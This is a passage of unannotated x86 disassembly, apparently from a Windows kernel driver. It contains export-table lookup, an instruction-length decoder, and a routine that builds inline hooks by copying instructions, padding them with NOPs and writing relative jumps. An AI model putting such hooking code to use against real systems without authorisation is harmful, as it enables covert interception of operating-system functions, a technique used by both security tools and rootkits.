   1968f:	mov    eax,DWORD PTR [ecx+0x4]
   19692:	mov    edx,DWORD PTR [ebp+0xc]
   19695:	push   ebx
   19696:	mov    ebx,DWORD PTR [edx+0x4]
   19699:	push   esi
   1969a:	push   edi
   1969b:	mov    DWORD PTR [ebp-0x4],eax
   1969e:	mov    DWORD PTR [ebp+0x8],eax
   196a1:	cmp    eax,ebx
   196a3:	jbe    0x196a8
   196a5:	mov    DWORD PTR [ebp+0x8],ebx
   196a8:	xor    eax,eax
   196aa:	cmp    DWORD PTR [ebp+0x8],eax
   196ad:	jbe    0x196c5
   196af:	mov    esi,DWORD PTR [ecx]
   196b1:	mov    edi,DWORD PTR [edx]
   196b3:	mov    cl,BYTE PTR [esi+eax*1]
   196b6:	mov    dl,BYTE PTR [edi+eax*1]
   196b9:	cmp    cl,dl
   196bb:	jl     0x196d2
   196bd:	jg     0x196d6
   196bf:	inc    eax
   196c0:	cmp    eax,DWORD PTR [ebp+0x8]
   196c3:	jb     0x196b3
   196c5:	cmp    DWORD PTR [ebp-0x4],ebx
   196c8:	setb   al
   196cb:	pop    edi
   196cc:	pop    esi
   196cd:	pop    ebx
   196ce:	leave  
   196cf:	ret    0x8
   196d2:	mov    al,0x1
   196d4:	jmp    0x196cb
   196d6:	xor    al,al
   196d8:	jmp    0x196cb
   196da:	int3   
   196db:	int3   
   196dc:	int3   
   196dd:	int3   
   196de:	int3   
   196df:	int3   
   196e0:	mov    edi,edi
   196e2:	push   ebp
   196e3:	mov    ebp,esp
   196e5:	mov    eax,DWORD PTR [ebp+0x8]
   196e8:	mov    ecx,DWORD PTR [eax+0x4]
   196eb:	mov    edx,DWORD PTR [ebp+0xc]
   196ee:	cmp    ecx,DWORD PTR [edx+0x4]
   196f1:	je     0x196f7
   196f3:	xor    al,al
   196f5:	jmp    0x19706
   196f7:	push   esi
   196f8:	mov    esi,DWORD PTR [eax]
   196fa:	push   edi
   196fb:	mov    edi,DWORD PTR [edx]
   196fd:	xor    eax,eax
   196ff:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   19701:	pop    edi
   19702:	sete   al
   19705:	pop    esi
   19706:	pop    ebp
   19707:	ret    0x8
   1970a:	int3   
   1970b:	int3   
   1970c:	int3   
   1970d:	int3   
   1970e:	int3   
   1970f:	int3   
   19710:	mov    edi,edi
   19712:	push   ebp
   19713:	mov    ebp,esp
   19715:	push   DWORD PTR [ebp+0xc]
   19718:	push   DWORD PTR [ebp+0x8]
   1971b:	call   0x196e0
   19720:	xor    ecx,ecx
   19722:	test   al,al
   19724:	sete   cl
   19727:	mov    al,cl
   19729:	pop    ebp
   1972a:	ret    0x8
   1972d:	int3   
   1972e:	int3   
   1972f:	int3   
   19730:	int3   
   19731:	int3   
   19732:	mov    edi,edi
   19734:	push   ebp
   19735:	mov    ebp,esp
   19737:	push   ecx
   19738:	mov    ecx,DWORD PTR [ebp+0x8]
   1973b:	mov    eax,DWORD PTR [ebp+0xc]
   1973e:	push   ebx
   1973f:	mov    ebx,DWORD PTR [eax+0x4]
   19742:	push   esi
   19743:	push   edi
   19744:	mov    edi,DWORD PTR [ecx+0x4]
   19747:	mov    DWORD PTR [ebp-0x4],edi
   1974a:	cmp    edi,ebx
   1974c:	jbe    0x19750
   1974e:	mov    edi,ebx
   19750:	and    DWORD PTR [ebp+0x8],0x0
   19754:	test   edi,edi
   19756:	jbe    0x19776
   19758:	mov    eax,DWORD PTR [eax]
   1975a:	mov    ecx,DWORD PTR [ecx]
   1975c:	sub    ecx,eax
   1975e:	movzx  edx,WORD PTR [ecx+eax*1]
   19762:	movzx  esi,WORD PTR [eax]
   19765:	cmp    dx,si
   19768:	jb     0x19783
   1976a:	ja     0x19787
   1976c:	inc    DWORD PTR [ebp+0x8]
   1976f:	inc    eax
   19770:	inc    eax
   19771:	cmp    DWORD PTR [ebp+0x8],edi
   19774:	jb     0x1975e
   19776:	cmp    DWORD PTR [ebp-0x4],ebx
   19779:	setb   al
   1977c:	pop    edi
   1977d:	pop    esi
   1977e:	pop    ebx
   1977f:	leave  
   19780:	ret    0x8
   19783:	mov    al,0x1
   19785:	jmp    0x1977c
   19787:	xor    al,al
   19789:	jmp    0x1977c
   1978b:	int3   
   1978c:	int3   
   1978d:	int3   
   1978e:	int3   
   1978f:	int3   
   19790:	mov    edi,edi
   19792:	push   ebp
   19793:	mov    ebp,esp
   19795:	pop    ebp
   19796:	jmp    0x19686
   1979b:	int3   
   1979c:	int3   
   1979d:	int3   
   1979e:	int3   
   1979f:	int3   
   197a0:	mov    edi,edi
   197a2:	push   ebp
   197a3:	mov    ebp,esp
   197a5:	pop    ebp
   197a6:	jmp    0x196e0
   197ab:	int3   
   197ac:	int3   
   197ad:	int3   
   197ae:	int3   
   197af:	int3   
   197b0:	mov    edi,edi
   197b2:	push   ebp
   197b3:	mov    ebp,esp
   197b5:	pop    ebp
   197b6:	jmp    0x19710
   197bb:	int3   
   197bc:	int3   
   197bd:	int3   
   197be:	int3   
   197bf:	int3   
   197c0:	mov    edi,edi
   197c2:	push   ebp
   197c3:	mov    ebp,esp
   197c5:	pop    ebp
   197c6:	jmp    0x19732
   197cb:	int3   
   197cc:	int3   
   197cd:	int3   
   197ce:	int3   
   197cf:	int3   
   197d0:	mov    edi,edi
   197d2:	push   ebp
   197d3:	mov    ebp,esp
   197d5:	mov    eax,DWORD PTR [ebp+0x8]
   197d8:	mov    cl,BYTE PTR [ebp+0xc]
   197db:	mov    BYTE PTR [eax],cl
   197dd:	inc    eax
   197de:	pop    ebp
   197df:	ret    0x8
   197e2:	int3   
   197e3:	int3   
   197e4:	int3   
   197e5:	int3   
   197e6:	int3   
   197e7:	int3   
   197e8:	mov    edi,edi
   197ea:	push   ebp
   197eb:	mov    ebp,esp
   197ed:	mov    eax,DWORD PTR [ebp+0x8]
   197f0:	mov    ecx,DWORD PTR [ebp+0xc]
   197f3:	mov    DWORD PTR [eax],ecx
   197f5:	add    eax,0x4
   197f8:	pop    ebp
   197f9:	ret    0x8
   197fc:	int3   
   197fd:	int3   
   197fe:	int3   
   197ff:	int3   
   19800:	int3   
   19801:	int3   
   19802:	mov    edi,edi
   19804:	push   ebp
   19805:	mov    ebp,esp
   19807:	mov    eax,DWORD PTR [ebp+0x8]
   1980a:	mov    cx,WORD PTR [ebp+0xc]
   1980e:	mov    WORD PTR [eax],cx
   19811:	add    eax,0x2
   19814:	pop    ebp
   19815:	ret    0x8
   19818:	int3   
   19819:	int3   
   1981a:	int3   
   1981b:	int3   
   1981c:	int3   
   1981d:	int3   
   1981e:	mov    edi,edi
   19820:	push   ebp
   19821:	mov    ebp,esp
   19823:	push   esi
   19824:	mov    esi,DWORD PTR [ebp+0x10]
   19827:	push   edi
   19828:	mov    edi,DWORD PTR [ebp+0x8]
   1982b:	push   esi
   1982c:	push   DWORD PTR [ebp+0xc]
   1982f:	push   edi
   19830:	call   0x1da7a
   19835:	add    esp,0xc
   19838:	lea    eax,[edi+esi*1]
   1983b:	pop    edi
   1983c:	pop    esi
   1983d:	pop    ebp
   1983e:	ret    0xc
   19841:	int3   
   19842:	int3   
   19843:	int3   
   19844:	int3   
   19845:	int3   
   19846:	mov    edi,edi
   19848:	push   ebp
   19849:	mov    ebp,esp
   1984b:	mov    eax,DWORD PTR [ebp+0xc]
   1984e:	mov    ecx,DWORD PTR [ebp+0x8]
   19851:	sub    ecx,eax
   19853:	sub    ecx,0x5
   19856:	mov    BYTE PTR [eax],0xe9
   19859:	mov    DWORD PTR [eax+0x1],ecx
   1985c:	add    eax,0x5
   1985f:	pop    ebp
   19860:	ret    0x8
   19863:	int3   
   19864:	int3   
   19865:	int3   
   19866:	int3   
   19867:	int3   
   19868:	mov    edi,edi
   1986a:	push   ebp
   1986b:	mov    ebp,esp
   1986d:	push   ecx
   1986e:	push   ebx
   1986f:	mov    ebx,DWORD PTR [ebp+0x8]
   19872:	and    DWORD PTR [ebp+0x8],0x0
   19876:	push   edi
   19877:	mov    edi,ebx
   19879:	test   ebx,ebx
   1987b:	jne    0x19881
   1987d:	xor    eax,eax
   1987f:	jmp    0x198db
   19881:	push   esi
   19882:	push   0x20736649
   19887:	push   0x80
   1988c:	push   0x0
   1988e:	call   DWORD PTR ds:0x1ee2c
   19894:	mov    esi,eax
   19896:	mov    DWORD PTR [ebp-0x4],esi
   19899:	push   0x0
   1989b:	push   edi
   1989c:	push   esi
   1989d:	call   0x19f8a
   198a2:	mov    ecx,eax
   198a4:	sub    ecx,edi
   198a6:	add    DWORD PTR [ebp+0x8],ecx
   198a9:	add    esi,ecx
   198ab:	cmp    DWORD PTR [ebp+0x8],0x5
   198af:	mov    edi,eax
   198b1:	jb     0x19899
   198b3:	push   DWORD PTR [ebp+0x8]
   198b6:	push   0x90
   198bb:	push   ebx
   198bc:	call   0x1da92
   198c1:	add    esp,0xc
   198c4:	push   esi
   198c5:	lea    eax,[ebx+0x5]
   198c8:	push   eax
   198c9:	call   0x19846
   198ce:	push   ebx
   198cf:	push   DWORD PTR [ebp+0xc]
   198d2:	call   0x19846
   198d7:	mov    eax,DWORD PTR [ebp-0x4]
   198da:	pop    esi
   198db:	pop    edi
   198dc:	pop    ebx
   198dd:	leave  
   198de:	ret    0x8
   198e1:	int3   
   198e2:	int3   
   198e3:	int3   
   198e4:	int3   
   198e5:	int3   
   198e6:	mov    edi,edi
   198e8:	push   ebp
   198e9:	mov    ebp,esp
   198eb:	mov    eax,DWORD PTR [ebp+0x8]
   198ee:	mov    eax,DWORD PTR [eax+0x1]
   198f1:	pop    ebp
   198f2:	ret    0x4
   198f5:	int3   
   198f6:	int3   
   198f7:	int3   
   198f8:	int3   
   198f9:	int3   
   198fa:	mov    edi,edi
   198fc:	push   ebp
   198fd:	mov    ebp,esp
   198ff:	mov    ecx,DWORD PTR [ebp+0x8]
   19902:	movzx  eax,WORD PTR [ecx+0x14]
   19906:	lea    eax,[eax+ecx*1+0x18]
   1990a:	movzx  ecx,WORD PTR [ecx+0x6]
   1990e:	push   esi
   1990f:	xor    esi,esi
   19911:	push   edi
   19912:	test   ecx,ecx
   19914:	jbe    0x19930
   19916:	mov    edx,DWORD PTR [eax+0xc]
   19919:	cmp    DWORD PTR [ebp+0xc],edx
   1991c:	jb     0x19928
   1991e:	mov    edi,DWORD PTR [eax+0x8]
   19921:	add    edi,edx
   19923:	cmp    DWORD PTR [ebp+0xc],edi
   19926:	jb     0x19932
   19928:	add    eax,0x28
   1992b:	inc    esi
   1992c:	cmp    esi,ecx
   1992e:	jb     0x19916
   19930:	xor    eax,eax
   19932:	pop    edi
   19933:	pop    esi
   19934:	pop    ebp
   19935:	ret    0x8
   19938:	int3   
   19939:	int3   
   1993a:	int3   
   1993b:	int3   
   1993c:	int3   
   1993d:	int3   
   1993e:	mov    edi,edi
   19940:	push   ebp
   19941:	mov    ebp,esp
   19943:	push   esi
   19944:	push   DWORD PTR [ebp+0xc]
   19947:	mov    esi,DWORD PTR [ebp+0x8]
   1994a:	push   esi
   1994b:	call   0x198fa
   19950:	mov    ecx,eax
   19952:	test   ecx,ecx
   19954:	je     0x19967
   19956:	mov    eax,DWORD PTR [esi+0x3c]
   19959:	dec    eax
   1995a:	not    eax
   1995c:	and    eax,DWORD PTR [ecx+0x14]
   1995f:	sub    eax,DWORD PTR [ecx+0xc]
   19962:	add    eax,DWORD PTR [ebp+0xc]
   19965:	jmp    0x1996a
   19967:	mov    eax,DWORD PTR [ebp+0xc]
   1996a:	pop    esi
   1996b:	pop    ebp
   1996c:	ret    0x8
   1996f:	int3   
   19970:	int3   
   19971:	int3   
   19972:	int3   
   19973:	int3   
   19974:	mov    edi,edi
   19976:	push   ebp
   19977:	mov    ebp,esp
   19979:	cmp    DWORD PTR [ebp+0x10],0x0
   1997d:	je     0x19984
   1997f:	mov    eax,DWORD PTR [ebp+0xc]
   19982:	jmp    0x1998f
   19984:	push   DWORD PTR [ebp+0xc]
   19987:	push   DWORD PTR [ebp+0x8]
   1998a:	call   0x1993e
   1998f:	pop    ebp
   19990:	ret    0xc
   19993:	int3   
   19994:	int3   
   19995:	int3   
   19996:	int3   
   19997:	int3   
   19998:	mov    edi,edi
   1999a:	push   ebp
   1999b:	mov    ebp,esp
   1999d:	sub    esp,0x1c
   199a0:	push   ebx
   199a1:	push   esi
   199a2:	mov    esi,DWORD PTR [ebp+0x8]
   199a5:	push   edi
   199a6:	push   esi
   199a7:	call   0x11866
   199ac:	call   eax
   199ae:	mov    ebx,eax
   199b0:	lea    eax,[ebp-0x14]
   199b3:	push   eax
   199b4:	push   0x0
   199b6:	push   0x0
   199b8:	push   esi
   199b9:	mov    DWORD PTR [ebp-0x4],ebx
   199bc:	call   0x11890
   199c1:	call   eax
   199c3:	mov    edi,eax
   199c5:	mov    eax,DWORD PTR [ebx+0x50]
   199c8:	mov    ecx,edi
   199ca:	sub    ecx,esi
   199cc:	cmp    eax,ecx
   199ce:	jb     0x19a1f
   199d0:	mov    ecx,DWORD PTR [ebp-0x14]
   199d3:	sub    ecx,esi
   199d5:	add    ecx,edi
   199d7:	cmp    eax,ecx
   199d9:	jb     0x19a1f
   199db:	push   DWORD PTR [ebp+0x10]
   199de:	push   DWORD PTR [edi+0x20]
   199e1:	push   ebx
   199e2:	call   0x19974
   199e7:	push   DWORD PTR [ebp+0x10]
   199ea:	mov    ebx,eax
   199ec:	push   DWORD PTR [edi+0x1c]
   199ef:	add    ebx,esi
   199f1:	push   DWORD PTR [ebp-0x4]
   199f4:	call   0x19974
   199f9:	push   DWORD PTR [ebp+0x10]
   199fc:	add    eax,esi
   199fe:	push   DWORD PTR [edi+0x24]
   19a01:	mov    DWORD PTR [ebp-0x1c],eax
   19a04:	push   DWORD PTR [ebp-0x4]
   19a07:	call   0x19974
   19a0c:	and    DWORD PTR [ebp-0xc],0x0
   19a10:	add    eax,esi
   19a12:	mov    esi,DWORD PTR [edi+0x18]
   19a15:	mov    DWORD PTR [ebp-0x18],eax
   19a18:	mov    DWORD PTR [ebp-0x8],esi
   19a1b:	test   esi,esi
   19a1d:	jg     0x19a2b
   19a1f:	xor    eax,eax
   19a21:	pop    edi
   19a22:	pop    esi
   19a23:	pop    ebx
   19a24:	leave  
   19a25:	ret    0xc
   19a28:	mov    esi,DWORD PTR [ebp-0x8]
   19a2b:	mov    eax,DWORD PTR [ebp-0xc]
   19a2e:	push   DWORD PTR [ebp+0x10]
   19a31:	add    esi,eax
   19a33:	mov    eax,DWORD PTR [ebp+0xc]
   19a36:	sar    esi,1
   19a38:	push   DWORD PTR [ebx+esi*4]
   19a3b:	mov    DWORD PTR [ebp-0x10],eax
   19a3e:	push   DWORD PTR [ebp-0x4]
   19a41:	call   0x19974
   19a46:	add    eax,DWORD PTR [ebp+0x8]
   19a49:	mov    cl,BYTE PTR [eax]
   19a4b:	mov    edx,DWORD PTR [ebp-0x10]
   19a4e:	cmp    cl,BYTE PTR [edx]
   19a50:	jne    0x19a6d
   19a52:	test   cl,cl
   19a54:	je     0x19a69
   19a56:	mov    cl,BYTE PTR [eax+0x1]
   19a59:	cmp    cl,BYTE PTR [edx+0x1]
   19a5c:	jne    0x19a6d
   19a5e:	inc    eax
   19a5f:	inc    eax
   19a60:	inc    edx
   19a61:	inc    edx
   19a62:	mov    DWORD PTR [ebp-0x10],edx
   19a65:	test   cl,cl
   19a67:	jne    0x19a49
   19a69:	xor    eax,eax
   19a6b:	jmp    0x19a72
   19a6d:	sbb    eax,eax
   19a6f:	sbb    eax,0xffffffff
   19a72:	test   eax,eax
   19a74:	je     0x19a8b
   19a76:	jge    0x19a7e
   19a78:	inc    esi
   19a79:	mov    DWORD PTR [ebp-0xc],esi
   19a7c:	jmp    0x19a81
   19a7e:	mov    DWORD PTR [ebp-0x8],esi
   19a81:	mov    eax,DWORD PTR [ebp-0x8]
   19a84:	cmp    DWORD PTR [ebp-0xc],eax
   19a87:	jl     0x19a28
   19a89:	jmp    0x19a1f
   19a8b:	mov    eax,DWORD PTR [ebp-0x18]
   19a8e:	movzx  eax,WORD PTR [eax+esi*2]
   19a92:	mov    ecx,DWORD PTR [ebp-0x1c]
   19a95:	mov    ecx,DWORD PTR [ecx+eax*4]
   19a98:	mov    eax,ecx
   19a9a:	sub    eax,edi
   19a9c:	add    eax,DWORD PTR [ebp+0x8]
   19a9f:	cmp    eax,DWORD PTR [ebp-0x14]
   19aa2:	sbb    eax,eax
   19aa4:	not    eax
   19aa6:	and    eax,ecx
   19aa8:	jmp    0x19a21
   19aad:	int3   
   19aae:	int3   
   19aaf:	int3   
   19ab0:	int3   
   19ab1:	int3   
   19ab2:	mov    edi,edi
   19ab4:	push   ebp
   19ab5:	mov    ebp,esp
   19ab7:	sub    esp,0x818
   19abd:	mov    eax,ds:0x7e528
   19ac2:	xor    eax,ebp
   19ac4:	mov    DWORD PTR [ebp-0x4],eax
   19ac7:	mov    eax,DWORD PTR [ebp+0x8]
   19aca:	mov    ecx,DWORD PTR [ebp+0xc]
   19acd:	push   esi
   19ace:	push   edi
   19acf:	mov    DWORD PTR [ebp-0x7e4],eax
   19ad5:	xor    esi,esi
   19ad7:	xor    eax,eax
   19ad9:	push   ecx
   19ada:	mov    DWORD PTR [ebp-0x7f0],esi
   19ae0:	lea    edi,[ebp-0x7ec]
   19ae6:	stos   DWORD PTR es:[edi],eax
   19ae7:	lea    eax,[ebp-0x7d4]
   19aed:	push   0x1ebc8
   19af2:	push   eax
   19af3:	mov    DWORD PTR [ebp-0x7dc],esi
   19af9:	mov    DWORD PTR [ebp-0x7e8],esi
   19aff:	call   DWORD PTR ds:0x1ee48
   19b05:	add    esp,0xc
   19b08:	lea    eax,[ebp-0x7d4]
   19b0e:	push   eax
   19b0f:	lea    eax,[ebp-0x810]
   19b15:	push   eax
   19b16:	call   0x11c2c
   19b1b:	call   eax
   19b1d:	push   0x10
   19b1f:	lea    eax,[ebp-0x810]
   19b25:	mov    DWORD PTR [ebp-0x800],eax
   19b2b:	push   0x1
   19b2d:	lea    eax,[ebp-0x818]
   19b33:	push   eax
   19b34:	lea    eax,[ebp-0x808]
   19b3a:	push   eax
   19b3b:	push   0x80100000
   19b40:	lea    eax,[ebp-0x7e0]
   19b46:	push   eax
   19b47:	mov    DWORD PTR [ebp-0x808],0x18
   19b51:	mov    DWORD PTR [ebp-0x804],esi
   19b57:	mov    DWORD PTR [ebp-0x7fc],esi
   19b5d:	mov    DWORD PTR [ebp-0x7f8],esi
   19b63:	mov    DWORD PTR [ebp-0x7f4],esi
   19b69:	call   0x11716
   19b6e:	call   eax
   19b70:	cmp    eax,esi
   19b72:	jl     0x19bf3
   19b74:	push   ebx
   19b75:	push   DWORD PTR [ebp-0x7e0]
   19b7b:	lea    eax,[ebp-0x7f0]
   19b81:	push   DWORD PTR [ebp+0x10]
   19b84:	push   0x2
   19b86:	push   eax
   19b87:	push   esi
   19b88:	push   0x4
   19b8a:	lea    eax,[ebp-0x7d8]
   19b90:	push   eax
   19b91:	call   DWORD PTR ds:0x1ee54
   19b97:	push   DWORD PTR [ebp-0x7e0]
   19b9d:	mov    edi,DWORD PTR ds:0x1ee60
   19ba3:	mov    ebx,eax
   19ba5:	call   edi
   19ba7:	cmp    ebx,esi
   19ba9:	jl     0x19bde
   19bab:	push   0x2
   19bad:	push   esi
   19bae:	push   0x2
   19bb0:	lea    eax,[ebp-0x7e8]
   19bb6:	push   eax
   19bb7:	push   esi
   19bb8:	push   esi
   19bb9:	push   esi
   19bba:	lea    eax,[ebp-0x7dc]
   19bc0:	push   eax
   19bc1:	push   0xffffffff
   19bc3:	push   DWORD PTR [ebp-0x7d8]
   19bc9:	call   0x11bae
   19bce:	call   eax
   19bd0:	push   DWORD PTR [ebp-0x7d8]
   19bd6:	mov    ebx,eax
   19bd8:	call   edi
   19bda:	cmp    ebx,esi
   19bdc:	jge    0x19be2
   19bde:	mov    eax,ebx
   19be0:	jmp    0x19bf2
   19be2:	mov    eax,DWORD PTR [ebp-0x7dc]
   19be8:	mov    ecx,DWORD PTR [ebp-0x7e4]
   19bee:	mov    DWORD PTR [ecx],eax
   19bf0:	xor    eax,eax
   19bf2:	pop    ebx
   19bf3:	mov    ecx,DWORD PTR [ebp-0x4]
   19bf6:	pop    edi
   19bf7:	xor    ecx,ebp
   19bf9:	pop    esi
   19bfa:	call   0x1da15
   19bff:	leave  
   19c00:	ret    0xc
   19c03:	int3   
   19c04:	int3   
   19c05:	int3   
   19c06:	int3   
   19c07:	int3   
   19c08:	mov    edi,edi
   19c0a:	push   ebp
   19c0b:	mov    ebp,esp
   19c0d:	push   DWORD PTR [ebp+0x8]
   19c10:	push   0xffffffff
   19c12:	call   0x11bd8
   19c17:	call   eax
   19c19:	pop    ebp
   19c1a:	ret    0x4
   19c1d:	int3   
   19c1e:	int3   
   19c1f:	int3   
   19c20:	int3   
   19c21:	int3   
   19c22:	mov    edi,edi
   19c24:	push   ebp
   19c25:	mov    ebp,esp
   19c27:	push   esi
   19c28:	mov    esi,DWORD PTR [ebp+0x8]
   19c2b:	test   esi,esi
   19c2d:	jne    0x19c32
   19c2f:	lea    esi,[ecx+0x18]
   19c32:	mov    edx,DWORD PTR [ebp+0xc]
   19c35:	test   edx,edx
   19c37:	jne    0x19c3d
   19c39:	xor    eax,eax
   19c3b:	jmp    0x19c4d
   19c3d:	movzx  eax,BYTE PTR [edx]
   19c40:	push   edx
   19c41:	lea    eax,[eax*8+0x7a560]
   19c48:	push   esi
   19c49:	push   eax
   19c4a:	call   DWORD PTR [eax+0x4]
   19c4d:	pop    esi
   19c4e:	pop    ebp
   19c4f:	ret    0x8
   19c52:	int3   
   19c53:	int3   
   19c54:	int3   
   19c55:	int3   
   19c56:	int3   
   19c57:	int3   
   19c58:	mov    edi,edi
   19c5a:	push   ebp
   19c5b:	mov    ebp,esp
   19c5d:	mov    eax,DWORD PTR [ebp+0x14]
   19c60:	push   ebx
   19c61:	mov    ebx,DWORD PTR [ebp+0x8]
   19c64:	push   esi
   19c65:	mov    esi,DWORD PTR [ebp+0x10]
   19c68:	sub    esi,eax
   19c6a:	push   edi
   19c6b:	lea    edi,[ebx+eax*1]
   19c6e:	mov    eax,esi
   19c70:	xor    edx,edx
   19c72:	dec    eax
   19c73:	je     0x19c94
   19c75:	dec    eax
   19c76:	je     0x19c86
   19c78:	dec    eax
   19c79:	dec    eax
   19c7a:	jne    0x19ca0
   19c7c:	mov    eax,DWORD PTR [ecx+0xc]
   19c7f:	mov    edx,DWORD PTR [edi]
   19c81:	and    DWORD PTR [eax],0x0
   19c84:	jmp    0x19ca0
   19c86:	mov    eax,DWORD PTR [ecx+0xc]
   19c89:	movsx  edx,WORD PTR [edi]
   19c8c:	mov    DWORD PTR [eax],0x2
   19c92:	jmp    0x19ca0
   19c94:	mov    eax,DWORD PTR [ecx+0xc]
   19c97:	movsx  edx,BYTE PTR [edi]
   19c9a:	mov    DWORD PTR [eax],0x3
   19ca0:	mov    ecx,DWORD PTR [ebp+0xc]
   19ca3:	lea    eax,[edx+ecx*1]
   19ca6:	add    eax,DWORD PTR [ebp+0x10]
   19ca9:	sub    edx,ebx
   19cab:	add    edx,ecx
   19cad:	dec    esi
   19cae:	je     0x19cc0
   19cb0:	dec    esi
   19cb1:	je     0x19cbb
   19cb3:	dec    esi
   19cb4:	dec    esi
   19cb5:	jne    0x19cc2
   19cb7:	mov    DWORD PTR [edi],edx
   19cb9:	jmp    0x19cc2
   19cbb:	mov    WORD PTR [edi],dx
   19cbe:	jmp    0x19cc2
   19cc0:	mov    BYTE PTR [edi],dl
   19cc2:	pop    edi
   19cc3:	pop    esi
   19cc4:	pop    ebx
   19cc5:	pop    ebp
   19cc6:	ret    0x10
   19cc9:	int3   
   19cca:	int3   
   19ccb:	int3   
   19ccc:	int3   
   19ccd:	int3   
   19cce:	mov    edi,edi
   19cd0:	push   ebp
   19cd1:	mov    ebp,esp
   19cd3:	mov    eax,DWORD PTR [ebp+0x10]
   19cd6:	inc    eax
   19cd7:	pop    ebp
   19cd8:	ret    0xc
   19cdb:	int3   
   19cdc:	int3   
   19cdd:	int3   
   19cde:	int3   
   19cdf:	int3   
   19ce0:	mov    edi,edi
   19ce2:	push   ebp
   19ce3:	mov    ebp,esp
   19ce5:	mov    eax,ecx
   19ce7:	mov    ecx,DWORD PTR [ebp+0x8]
   19cea:	and    DWORD PTR [eax],0x0
   19ced:	and    DWORD PTR [eax+0x4],0x0
   19cf1:	test   ecx,ecx
   19cf3:	jne    0x19cf8
   19cf5:	lea    ecx,[eax+0x14]
   19cf8:	mov    edx,DWORD PTR [ebp+0xc]
   19cfb:	mov    DWORD PTR [eax+0x8],ecx
   19cfe:	test   edx,edx
   19d00:	jne    0x19d05
   19d02:	lea    edx,[eax+0x10]
   19d05:	mov    DWORD PTR [eax+0xc],edx
   19d08:	and    DWORD PTR [ecx],0x0
   19d0b:	mov    ecx,DWORD PTR [eax+0xc]
   19d0e:	and    DWORD PTR [ecx],0x0
   19d11:	pop    ebp
   19d12:	ret    0x8
   19d15:	int3   
   19d16:	int3   
   19d17:	int3   
   19d18:	int3   
   19d19:	int3   
   19d1a:	mov    edi,edi
   19d1c:	push   ebp
   19d1d:	mov    ebp,esp
   19d1f:	push   ecx
   19d20:	mov    eax,DWORD PTR [ebp+0x8]
   19d23:	mov    eax,DWORD PTR [eax]
   19d25:	push   ebx
   19d26:	push   esi
   19d27:	push   edi
   19d28:	mov    DWORD PTR [ebp-0x4],ecx
   19d2b:	mov    esi,eax
   19d2d:	test   eax,0x200000
   19d32:	je     0x19d3f
   19d34:	cmp    DWORD PTR [ecx+0x4],0x0
   19d38:	je     0x19d44
   19d3a:	shr    esi,0xb
   19d3d:	jmp    0x19d47
   19d3f:	cmp    DWORD PTR [ecx],0x0
   19d42:	jmp    0x19d38
   19d44:	shr    esi,0x8
   19d47:	mov    ebx,DWORD PTR [ebp+0x10]
   19d4a:	and    esi,0x7
   19d4d:	shr    eax,0xe
   19d50:	and    eax,0x7
   19d53:	mov    edi,esi
   19d55:	jbe    0x19d91
   19d57:	add    eax,ebx
   19d59:	mov    cl,BYTE PTR [eax]
   19d5b:	movzx  edx,cl
   19d5e:	mov    dl,BYTE PTR [edx+0x7a460]
   19d64:	test   dl,0x10
   19d67:	je     0x19d89
   19d69:	mov    al,BYTE PTR [eax+0x1]
   19d6c:	and    al,0x7
   19d6e:	cmp    al,0x5
   19d70:	jne    0x19d89
   19d72:	and    cl,0xc0
   19d75:	je     0x19d86
   19d77:	cmp    cl,0x40
   19d7a:	jne    0x19d81
   19d7c:	lea    edi,[esi+0x1]
   19d7f:	jmp    0x19d89
   19d81:	cmp    cl,0x80
   19d84:	jne    0x19d89
   19d86:	lea    edi,[esi+0x4]
   19d89:	movzx  eax,dl
   19d8c:	and    eax,0xf
   19d8f:	add    edi,eax
   19d91:	push   edi
   19d92:	push   ebx
   19d93:	push   DWORD PTR [ebp+0xc]
   19d96:	call   0x1da7a
   19d9b:	mov    ecx,DWORD PTR [ebp+0x8]
   19d9e:	mov    eax,DWORD PTR [ecx]
   19da0:	shl    eax,0xc
   19da3:	sar    eax,0x1d
   19da6:	add    esp,0xc
   19da9:	test   eax,eax
   19dab:	je     0x19dc7
   19dad:	push   eax
   19dae:	push   esi
   19daf:	mov    esi,DWORD PTR [ebp-0x4]
   19db2:	push   ebx
   19db3:	push   DWORD PTR [ebp+0xc]
   19db6:	mov    ecx,esi
   19db8:	call   0x19c58
   19dbd:	mov    ecx,DWORD PTR [esi+0x8]
   19dc0:	mov    DWORD PTR [ecx],eax
   19dc2:	mov    ecx,DWORD PTR [ebp+0x8]
   19dc5:	jmp    0x19dca
   19dc7:	mov    esi,DWORD PTR [ebp-0x4]
   19dca:	test   DWORD PTR [ecx],0x400000
   19dd0:	je     0x19dd7
   19dd2:	mov    eax,DWORD PTR [esi+0xc]
   19dd5:	neg    DWORD PTR [eax]
   19dd7:	test   DWORD PTR [ecx],0x100000
   19ddd:	je     0x19de5
   19ddf:	mov    eax,DWORD PTR [esi+0x8]
   19de2:	or     DWORD PTR [eax],0xffffffff
   19de5:	lea    eax,[edi+ebx*1]
   19de8:	pop    edi
   19de9:	pop    esi
   19dea:	pop    ebx
   19deb:	leave  
   19dec:	ret    0xc
   19def:	int3   
   19df0:	int3   
   19df1:	int3   
   19df2:	int3   
   19df3:	int3   
   19df4:	mov    edi,edi
   19df6:	push   ebp
   19df7:	mov    ebp,esp
   19df9:	push   ebx
   19dfa:	push   esi
   19dfb:	mov    esi,DWORD PTR [ebp+0x10]
   19dfe:	push   edi
   19dff:	mov    edi,DWORD PTR [ebp+0xc]
   19e02:	push   esi
   19e03:	push   edi
   19e04:	push   DWORD PTR [ebp+0x8]
   19e07:	mov    ebx,ecx
   19e09:	call   0x19d1a
   19e0e:	lea    eax,[esi+0x1]
   19e11:	movzx  edx,BYTE PTR [eax]
   19e14:	push   eax
   19e15:	inc    edi
   19e16:	lea    edx,[edx*8+0x7a560]
   19e1d:	push   edi
   19e1e:	push   edx
   19e1f:	mov    ecx,ebx
   19e21:	call   DWORD PTR [edx+0x4]
   19e24:	pop    edi
   19e25:	pop    esi
   19e26:	pop    ebx
   19e27:	pop    ebp
   19e28:	ret    0xc
   19e2b:	int3   
   19e2c:	int3   
   19e2d:	int3   
   19e2e:	int3   
   19e2f:	int3   
   19e30:	mov    edi,edi
   19e32:	push   ebp
   19e33:	mov    ebp,esp
   19e35:	push   ebx
   19e36:	push   esi
   19e37:	mov    esi,DWORD PTR [ebp+0x10]
   19e3a:	push   edi
   19e3b:	mov    edi,DWORD PTR [ebp+0xc]
   19e3e:	push   esi
   19e3f:	push   edi
   19e40:	push   DWORD PTR [ebp+0x8]
   19e43:	mov    ebx,ecx
   19e45:	call   0x19d1a
